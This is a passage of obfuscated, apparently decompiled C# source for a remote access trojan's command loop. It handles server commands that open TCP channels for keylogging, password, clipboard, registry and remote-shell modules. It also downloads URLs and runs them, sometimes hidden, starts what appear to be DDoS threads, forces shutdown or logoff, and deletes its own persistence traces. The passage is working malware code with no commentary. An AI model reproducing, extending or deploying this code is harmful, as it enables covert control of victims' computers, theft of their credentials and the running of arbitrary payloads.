							mQSTi8lfx9R4lRqEZjJhdk75 = new StreamWriter(wWTgv0SRYzICOWukIfM6tM74);
							KKADU3gsncz1bC4WxXLruK77 = new Thread(ogCUyT0193);
							KKADU3gsncz1bC4WxXLruK77.Start();
							mQSTi8lfx9R4lRqEZjJhdk75.WriteLine("/TRYWEBBB/");
							mQSTi8lfx9R4lRqEZjJhdk75.Flush();
							continue;
						case "/TRYTRYFM/":
							tcpClient_1 = new TcpClient();
							tcpClient_1.Connect(nZZEKWj4rLgtFjmCxsUb2QER177, wiSrmNwqC1gJSTHkagHbEi5E178);
							azRLxKcxWA30BZnxNTQnq479 = tcpClient_1.GetStream();
							streamReader_0 = new StreamReader(azRLxKcxWA30BZnxNTQnq479);
							J580cztlCh0prHvvQRNdyH80 = new StreamWriter(azRLxKcxWA30BZnxNTQnq479);
							thread_0 = new Thread(method_13);
							thread_0.Start();
							J580cztlCh0prHvvQRNdyH80.WriteLine("/TRYFMMMM/");
							J580cztlCh0prHvvQRNdyH80.Flush();
							continue;
						case "/TRYTRYIN/":
							tcpClient_2 = new TcpClient();
							tcpClient_2.Connect(nZZEKWj4rLgtFjmCxsUb2QER177, wiSrmNwqC1gJSTHkagHbEi5E178);
							WIgtgeUVk84 = tcpClient_2.GetStream();
							streamReader_1 = new StreamReader(WIgtgeUVk84);
							SnN5zNIYZ85 = new StreamWriter(WIgtgeUVk84);
							PhqKGp3zj87 = new Thread(method_14);
							PhqKGp3zj87.Start();
							SnN5zNIYZ85.WriteLine("/TRYINFOO/");
							SnN5zNIYZ85.Flush();
							continue;
						case "/TRYTRYMS/":
							Lbgc3BoOx88 = new TcpClient();
							Lbgc3BoOx88.Connect(nZZEKWj4rLgtFjmCxsUb2QER177, wiSrmNwqC1gJSTHkagHbEi5E178);
							P1M31Ujav89 = Lbgc3BoOx88.GetStream();
							U8Ho2ZuWN91 = new StreamReader(P1M31Ujav89);
							C4rq6b25E90 = new StreamWriter(P1M31Ujav89);
							IWBVutix392 = new Thread(uuC4oPu197);
							IWBVutix392.Start();
							C4rq6b25E90.WriteLine("/TRYMSGGG/");
							C4rq6b25E90.Flush();
							continue;
						case "/TRYTRYFN/":
							oLfvrvTqv93 = new TcpClient();
							oLfvrvTqv93.Connect(nZZEKWj4rLgtFjmCxsUb2QER177, wiSrmNwqC1gJSTHkagHbEi5E178);
							Sl559XWuG94 = oLfvrvTqv93.GetStream();
							THAY7y8Dk96 = new StreamReader(Sl559XWuG94);
							PrZNz47Ad95 = new StreamWriter(Sl559XWuG94);
							poGcuBuBB97 = new Thread(gZDMdrT198);
							poGcuBuBB97.Start();
							PrZNz47Ad95.WriteLine("/TRYFUNNN/");
							PrZNz47Ad95.Flush();
							continue;
						case "/TRYTRYIE/":
							IDNEYZMt698 = new TcpClient();
							IDNEYZMt698.Connect(nZZEKWj4rLgtFjmCxsUb2QER177, wiSrmNwqC1gJSTHkagHbEi5E178);
							networkStream_1 = IDNEYZMt698.GetStream();
							Dx5ZDW101 = new StreamReader(networkStream_1);
							VUdwXv100 = new StreamWriter(networkStream_1);
							ojXtoX102 = new Thread(BgMJJ9e199);
							ojXtoX102.Start();
							VUdwXv100.WriteLine("/TRYIEEEE/");
							VUdwXv100.Flush();
							continue;
						case "/TRYTRYCL/":
							qfIAbE103 = new TcpClient();
							qfIAbE103.Connect(nZZEKWj4rLgtFjmCxsUb2QER177, wiSrmNwqC1gJSTHkagHbEi5E178);
							s527dZ104 = qfIAbE103.GetStream();
							nbGh1r106 = new StreamReader(s527dZ104);
							QUuRyH105 = new StreamWriter(s527dZ104);
							TNP9Ei107 = new Thread(WNFTIZf200);
							TNP9Ei107.Start();
							QUuRyH105.WriteLine("/TRYCLIPP/");
							QUuRyH105.Flush();
							continue;
						case "/TRYTRYRD/":
							fHZTRK108 = new TcpClient();
							fHZTRK108.Connect(nZZEKWj4rLgtFjmCxsUb2QER177, wiSrmNwqC1gJSTHkagHbEi5E178);
							networkStream_2 = fHZTRK108.GetStream();
							rwKf5d111 = new StreamReader(networkStream_2);
							tvj69J110 = new StreamWriter(networkStream_2);
							h9dgGo112 = new Thread(method_15);
							h9dgGo112.Start();
							tvj69J110.WriteLine("/TRYRDDDD/");
							tvj69J110.Flush();
							continue;
						case "/TRYTRYPM/":
							OiqJRw113 = new TcpClient();
							OiqJRw113.Connect(nZZEKWj4rLgtFjmCxsUb2QER177, wiSrmNwqC1gJSTHkagHbEi5E178);
							ZX3KQe114 = OiqJRw113.GetStream();
							streamReader_2 = new StreamReader(ZX3KQe114);
							YN6NOv115 = new StreamWriter(ZX3KQe114);
							y0CMBHwKDkLLr117 = new Thread(gZONds6202);
							y0CMBHwKDkLLr117.Start();
							YN6NOv115.WriteLine("/TRYPMMMM/");
							YN6NOv115.Flush();
							continue;
						case "/TRYTRYSF/":
							JEN6bGHGwgh6t118 = new TcpClient();
							JEN6bGHGwgh6t118.Connect(nZZEKWj4rLgtFjmCxsUb2QER177, wiSrmNwqC1gJSTHkagHbEi5E178);
							lI9TKHBibRTdl119 = JEN6bGHGwgh6t118.GetStream();
							qZr2JkF8mOBKA121 = new StreamReader(lI9TKHBibRTdl119);
							ld5AE2ll4RjHs120 = new StreamWriter(lI9TKHBibRTdl119);
							thread_1 = new Thread(vw2Sb3x203);
							thread_1.Start();
							ld5AE2ll4RjHs120.WriteLine("/TRYSFFFF/");
							ld5AE2ll4RjHs120.Flush();
							continue;
						case "/TRYTRYLG/":
							eL7hQPchhBQ98123 = new TcpClient();
							eL7hQPchhBQ98123.Connect(nZZEKWj4rLgtFjmCxsUb2QER177, wiSrmNwqC1gJSTHkagHbEi5E178);
							zydYotQ3Zacw5124 = eL7hQPchhBQ98123.GetStream();
							MxiMyjoEkkCl5126 = new StreamReader(zydYotQ3Zacw5124);
							pOC5vQ675U05Y125 = new StreamWriter(zydYotQ3Zacw5124);
							thread_2 = new Thread(TLJjycx204);
							thread_2.Start();
							pOC5vQ675U05Y125.WriteLine("/TRYKEYYY/");
							pOC5vQ675U05Y125.Flush();
							continue;
						case "/TRYTRYPS/":
							tcpClient_3 = new TcpClient();
							tcpClient_3.Connect(nZZEKWj4rLgtFjmCxsUb2QER177, wiSrmNwqC1gJSTHkagHbEi5E178);
							S7q5uZJpI0yQj129 = tcpClient_3.GetStream();
							qsFqNM2Y2DkkT131 = new StreamReader(S7q5uZJpI0yQj129);
							streamWriter_0 = new StreamWriter(S7q5uZJpI0yQj129);
							FrGh1sDk7ydk88B8ALNd132 = new Thread(GWbFPf9205);
							FrGh1sDk7ydk88B8ALNd132.Start();
							streamWriter_0.WriteLine("/TRYPASSS/");
							streamWriter_0.Flush();
							continue;
						case "/TRYTRYPR/":
							NzhKidLNk2HS2gX9M0jb133 = new TcpClient();
							NzhKidLNk2HS2gX9M0jb133.Connect(nZZEKWj4rLgtFjmCxsUb2QER177, wiSrmNwqC1gJSTHkagHbEi5E178);
							eljTs5FErPsRx6659WZO134 = NzhKidLNk2HS2gX9M0jb133.GetStream();
							y7muAPkW9S0Q1vvole17136 = new StreamReader(eljTs5FErPsRx6659WZO134);
							GP04RkhRarmzrCZrgohc135 = new StreamWriter(eljTs5FErPsRx6659WZO134);
							ONuZtTqV7EPLEMfztvt2137 = new Thread(Uch2Rml206);
							ONuZtTqV7EPLEMfztvt2137.Start();
							GP04RkhRarmzrCZrgohc135.WriteLine("/TRYPROCC/");
							GP04RkhRarmzrCZrgohc135.Flush();
							continue;
						case "/TRYTRYSE/":
							ZlIirvxW7A51n9oLCm0H138 = new TcpClient();
							ZlIirvxW7A51n9oLCm0H138.Connect(nZZEKWj4rLgtFjmCxsUb2QER177, wiSrmNwqC1gJSTHkagHbEi5E178);
							ppOv2fcefVUQLY7s4cxY139 = ZlIirvxW7A51n9oLCm0H138.GetStream();
							jiGbFfgo2WGqO2mVBhWf141 = new StreamReader(ppOv2fcefVUQLY7s4cxY139);
							ltNxzNounuW7uMDzwdfc140 = new StreamWriter(ppOv2fcefVUQLY7s4cxY139);
							QHRLZNlZlxVRWlE2NCRj142 = new Thread(gXWwH8rgD0wWHd207);
							QHRLZNlZlxVRWlE2NCRj142.Start();
							ltNxzNounuW7uMDzwdfc140.WriteLine("/TRYSERVV/");
							ltNxzNounuW7uMDzwdfc140.Flush();
							continue;
						case "/TRYTRYOW/":
							xZsrOvirpHYfhZlCrVbS143 = new TcpClient();
							xZsrOvirpHYfhZlCrVbS143.Connect(nZZEKWj4rLgtFjmCxsUb2QER177, wiSrmNwqC1gJSTHkagHbEi5E178);
							Tg2u0Outoj8ZqCIQepXu144 = xZsrOvirpHYfhZlCrVbS143.GetStream();
							streamReader_3 = new StreamReader(Tg2u0Outoj8ZqCIQepXu144);
							uUzDzGAWZ2ARrYqgXYqZ145 = new StreamWriter(Tg2u0Outoj8ZqCIQepXu144);
							dxumJgyrbsTgZXsGRt4A147 = new Thread(jHbCnYz2D7ncWA208);
							dxumJgyrbsTgZXsGRt4A147.Start();
							uUzDzGAWZ2ARrYqgXYqZ145.WriteLine("/TRYOWWWW/");
							uUzDzGAWZ2ARrYqgXYqZ145.Flush();
							continue;
						case "/TRYTRYRG/":
							RVFuEzTJArzy37LukGmi148 = new TcpClient();
							RVFuEzTJArzy37LukGmi148.Connect(nZZEKWj4rLgtFjmCxsUb2QER177, wiSrmNwqC1gJSTHkagHbEi5E178);
							qmtPA620eH7dkjshR149 = RVFuEzTJArzy37LukGmi148.GetStream();
							ausQTxwTvTjmdKFuC151 = new StreamReader(qmtPA620eH7dkjshR149);
							ZHanOQKSlcRbYla7M150 = new StreamWriter(qmtPA620eH7dkjshR149);
							lZcUCvJWfUaOgmX6y152 = new Thread(jKQkGbCNMNR36q209);
							lZcUCvJWfUaOgmX6y152.Start();
							ZHanOQKSlcRbYla7M150.WriteLine("/TRYREGGG/");
							ZHanOQKSlcRbYla7M150.Flush();
							continue;
						case "/TRYTRYCM/":
							tcpClient_4 = new TcpClient();
							tcpClient_4.Connect(nZZEKWj4rLgtFjmCxsUb2QER177, wiSrmNwqC1gJSTHkagHbEi5E178);
							ZaURxYJUEDl4exmfF154 = tcpClient_4.GetStream();
							mNbHBY57qvhq4q4gt156 = new StreamReader(ZaURxYJUEDl4exmfF154);
							AIFBgQyqjyip7rX6V155 = new StreamWriter(ZaURxYJUEDl4exmfF154);
							Ru2KJkmqeqruxboXj157 = new Thread(ja8TxVAv5puoMd210);
							Ru2KJkmqeqruxboXj157.Start();
							AIFBgQyqjyip7rX6V155.WriteLine("/TRYCMDDD/");
							AIFBgQyqjyip7rX6V155.Flush();
							continue;
						case "/REMOVESV/":
							try
							{
								string text9 = Conversions.ToString(((ServerComputer)RWfjxtEPH2.Computer).get_Registry().get_CurrentUser().OpenSubKey(NBampsfdonlv113(vhAVNcEbjr2qnw5oW16.GuZZ3eNP8EMPqrNYY41(), "12345#$%"), writable: false)!.GetValue(NBampsfdonlv113(vhAVNcEbjr2qnw5oW16.jzQXHq2xjPj4YK94n42(), "12345#$%")));
								((ServerComputer)RWfjxtEPH2.Computer).get_FileSystem().DeleteFile(text9);
							}
							catch (Exception projectError27)
							{
								ProjectData.SetProjectError(projectError27);
								ProjectData.ClearProjectError();
							}
							try
							{
								((ServerComputer)RWfjxtEPH2.Computer).get_Registry().get_CurrentUser().OpenSubKey(NBampsfdonlv113(vhAVNcEbjr2qnw5oW16.GuZZ3eNP8EMPqrNYY41(), "12345#$%"), writable: true)!.DeleteValue(NBampsfdonlv113(vhAVNcEbjr2qnw5oW16.jzQXHq2xjPj4YK94n42(), "12345#$%"));
							}
							catch (Exception projectError28)
							{
								ProjectData.SetProjectError(projectError28);
								ProjectData.ClearProjectError();
							}
							try
							{
								string text10 = Conversions.ToString(((ServerComputer)RWfjxtEPH2.Computer).get_Registry().get_CurrentUser().OpenSubKey(NBampsfdonlv113(vhAVNcEbjr2qnw5oW16.GuZZ3eNP8EMPqrNYY41(), "12345#$%"), writable: false)!.GetValue(NBampsfdonlv113(vhAVNcEbjr2qnw5oW16.smethod_0(), "12345#$%")));
								((ServerComputer)RWfjxtEPH2.Computer).get_FileSystem().DeleteFile(text10);
							}
							catch (Exception projectError29)
							{
								ProjectData.SetProjectError(projectError29);
								ProjectData.ClearProjectError();
							}
							try
							{
								((ServerComputer)RWfjxtEPH2.Computer).get_Registry().get_CurrentUser().OpenSubKey(NBampsfdonlv113(vhAVNcEbjr2qnw5oW16.GuZZ3eNP8EMPqrNYY41(), "12345#$%"), writable: true)!.DeleteValue(NBampsfdonlv113(vhAVNcEbjr2qnw5oW16.smethod_0(), "12345#$%"));
							}
							catch (Exception projectError30)
							{
								ProjectData.SetProjectError(projectError30);
								ProjectData.ClearProjectError();
							}
							try
							{
								string executablePath = Application.get_ExecutablePath();
								string text11 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft";
								_ = text11 + "\\" + Path.GetFileName(executablePath);
								foreach (string file in ((ServerComputer)RWfjxtEPH2.Computer).get_FileSystem().GetFiles(text11))
								{
									try
									{
										if (((ServerComputer)RWfjxtEPH2.Computer).get_FileSystem().GetFileInfo(file).Length > 100000L)
										{
											((ServerComputer)RWfjxtEPH2.Computer).get_FileSystem().DeleteFile(file);
										}
									}
									catch (Exception projectError31)
									{
										ProjectData.SetProjectError(projectError31);
										ProjectData.ClearProjectError();
									}
								}
							}
							catch (Exception projectError32)
							{
								ProjectData.SetProjectError(projectError32);
								ProjectData.ClearProjectError();
							}
							try
							{
								Environment.Exit(0);
							}
							catch (Exception projectError33)
							{
								ProjectData.SetProjectError(projectError33);
								Environment.Exit(0);
								ProjectData.ClearProjectError();
							}
							continue;
						case "/DLARUNVS/":
							try
							{
								List<string> list2 = new List<string>();
								string[] array6 = Strings.Mid(text4, 11, Strings.Len(text4)).Split(new char[1] { '/' });
								string[] array7 = array6;
								foreach (string item2 in array7)
								{
									list2.Add(item2);
								}
								int index2 = list2.Count - 1;
								string text7 = Strings.Mid(text4, 11, Strings.Len(text4));
								string[] array8 = list2[index2].ToString().Split(new char[1] { '.' });
								string text8 = null;
								text8 = ((!((Operators.CompareString(array8[array8.Length - 1], "swf", false) == 0) | (Operators.CompareString(array8[array8.Length - 1], "SWF", false) == 0))) ? array8[array8.Length - 1] : "exe");
								((ServerComputer)RWfjxtEPH2.Computer).get_Network().DownloadFile(text7, Environment.GetEnvironmentVariable("Temp") + "\\" + array8[0] + "." + text8, (string)null, (string)null, false, 100000, true);
								method_6(1);
								Process.Start(Environment.GetEnvironmentVariable("Temp") + "\\" + array8[0] + "." + text8);
							}
							catch (Exception projectError26)
							{
								ProjectData.SetProjectError(projectError26);
								ProjectData.ClearProjectError();
							}
							continue;
						case "/DLARUNHD/":
							try
							{
								List<string> list = new List<string>();
								string[] array3 = Strings.Mid(text4, 11, Strings.Len(text4)).Split(new char[1] { '/' });
								string[] array4 = array3;
								foreach (string item in array4)
								{
									list.Add(item);
								}
								int index = list.Count - 1;
								string text5 = Strings.Mid(text4, 11, Strings.Len(text4));
								string[] array5 = list[index].ToString().Split(new char[1] { '.' });
								string text6 = null;
								text6 = ((!((Operators.CompareString(array5[array5.Length - 1], "swf", false) == 0) | (Operators.CompareString(array5[array5.Length - 1], "SWF", false) == 0))) ? array5[array5.Length - 1] : "exe");
								((ServerComputer)RWfjxtEPH2.Computer).get_Network().DownloadFile(text5, Environment.GetEnvironmentVariable("Temp") + "\\" + array5[0] + "." + text6, (string)null, (string)null, false, 100000, true);
								method_6(1);
								Process process = new Process();
								process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
								process.StartInfo.FileName = Environment.GetEnvironmentVariable("Temp") + "\\" + array5[0] + "." + text6;
								process.Start();
							}
							catch (Exception projectError25)
							{
								ProjectData.SetProjectError(projectError25);
								ProjectData.ClearProjectError();
							}
							continue;
						case "/RESTWIND/":
							try
							{
								Interaction.Shell("shutdown -r /t 0", (AppWinStyle)2, false, -1);
							}
							catch (Exception projectError24)
							{
								ProjectData.SetProjectError(projectError24);
								ProjectData.ClearProjectError();
							}
							continue;
						case "/TURNWIND/":
							try
							{
								Interaction.Shell("shutdown -s /t 0", (AppWinStyle)2, false, -1);
							}
							catch (Exception projectError23)
							{
								ProjectData.SetProjectError(projectError23);
								ProjectData.ClearProjectError();
							}
							continue;
						case "/LOGOWIND/":
							try
							{
								Interaction.Shell("shutdown -l /t 0", (AppWinStyle)2, false, -1);
							}
							catch (Exception projectError22)
							{
								ProjectData.SetProjectError(projectError22);
								ProjectData.ClearProjectError();
							}
							continue;
						case "/MEUPDATE/":
							continue;
						case "/BACKUPUP/":
							continue;
						case "/INSTALLK/":
							try
							{
								text4 = Strings.Mid(text4, 11, Strings.Len(text4));
								Thread thread7 = new Thread(tWSGyRuxpm181);
								thread7.Start(text4);
							}
							catch (Exception projectError21)
							{
								ProjectData.SetProjectError(projectError21);
								ProjectData.ClearProjectError();
							}
							continue;
						case "/UPANDRUN/":
							try
							{
								text4 = Strings.Mid(text4, 11, Strings.Len(text4));
								Thread thread6 = new Thread(E2T8NASu9QyJGpYYTODstaa160);
								thread6.Start(text4);
							}
							catch (Exception projectError20)
							{
								ProjectData.SetProjectError(projectError20);
								ProjectData.ClearProjectError();
							}
							continue;
						case "/DDATONWB/":
							try
							{
								text4 = Strings.Mid(text4, 11, Strings.Len(text4));
								Thread thread5 = new Thread(TYTpXRjgFAUfTkqG155);
								thread5.Start(text4);
							}
							catch (Exception projectError19)
							{
								ProjectData.SetProjectError(projectError19);
								ProjectData.ClearProjectError();
							}
							continue;
						case "/PASSALLL/":
							try
							{
								Thread thread4 = new Thread(EHBePh26Ad0pDpXk156);
								thread4.Start();
							}
							catch (Exception projectError18)
							{
								ProjectData.SetProjectError(projectError18);
								ProjectData.ClearProjectError();
							}
							continue;
						case "/OPENWEBB/":
							try
							{
								text4 = Strings.Mid(text4, 11, Strings.Len(text4));
								Thread thread3 = new Thread(method_7);
								thread3.Start(text4);
							}
							catch (Exception projectError17)
							{
								ProjectData.SetProjectError(projectError17);
								ProjectData.ClearProjectError();
							}
							continue;
						case "/DDATONWS/":
							try
							{
								Thread thread2 = new Thread(gURwJlwCVMPKQTCg158);
								thread2.Start();
							}
							catch (Exception projectError16)
							{
								ProjectData.SetProjectError(projectError16);
								ProjectData.ClearProjectError();
							}
							continue;
						case "/AVAILABL/":
							try
							{
								text4 = Strings.Mid(text4, 11, Strings.Len(text4));
								Thread thread = new Thread(CzfjPn6e4gbmsGRUWc9JxqB159);
								thread.Start(text4);
							}
							catch (Exception projectError15)
							{
								ProjectData.SetProjectError(projectError15);
								ProjectData.ClearProjectError();
							}
							continue;
						case "/RETURNSX/":
							try
							{
								text4 = Strings.Mid(text4, 11, Strings.Len(text4));
								try
								{
									try
									{
										if (Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(((ServerComputer)RWfjxtEPH2.Computer).get_Registry().get_CurrentUser().OpenSubKey("Software\\Microsoft", writable: false)!.GetValue("Client"), (object)text4, false))))
										{
											((ServerComputer)RWfjxtEPH2.Computer).get_Registry().get_CurrentUser().OpenSubKey("Software\\Microsoft", writable: true)!.SetValue("Client", text4, RegistryValueKind.String);
										}
									}
									catch (Exception projectError12)
									{
										ProjectData.SetProjectError(projectError12);
										ProjectData.ClearProjectError();
									}
								}
								catch (Exception projectError13)
								{
									ProjectData.SetProjectError(projectError13);
									ProjectData.ClearProjectError();
								}
							}
							catch (Exception projectError14)
							{
								ProjectData.SetProjectError(projectError14);
								ProjectData.ClearProjectError();
							}
							continue;
						}
						method_6(5);
						LELMUC70wIplcf15++;
						if (LELMUC70wIplcf15 <= 5)
						{
							continue;
						}
						try
						{
							aMz1o7THlkR30.WriteLine("test");
							aMz1o7THlkR30.Flush();
						}
						catch (Exception projectError34)
						{
							ProjectData.SetProjectError(projectError34);
							try
							{
								if (!IaeLz9Bz7vS28.Connected)
								{
									ProjectData.ClearProjectError();
									break;
								}
							}
							catch (Exception projectError35)
							{
								ProjectData.SetProjectError(projectError35);
								ProjectData.ClearProjectError();
							}
							ProjectData.ClearProjectError();
						}
					}
					catch (Exception projectError36)
					{
						ProjectData.SetProjectError(projectError36);
						ProjectData.ClearProjectError();
					}
				}
				try
				{
					OHxtsM5KXOcE7h7m0c6130();
					Thread.Sleep(100);
				}
				catch (Exception projectError37)
				{
					ProjectData.SetProjectError(projectError37);
					Thread.Sleep(100);
					ProjectData.ClearProjectError();
				}
			}
		}
	}
}
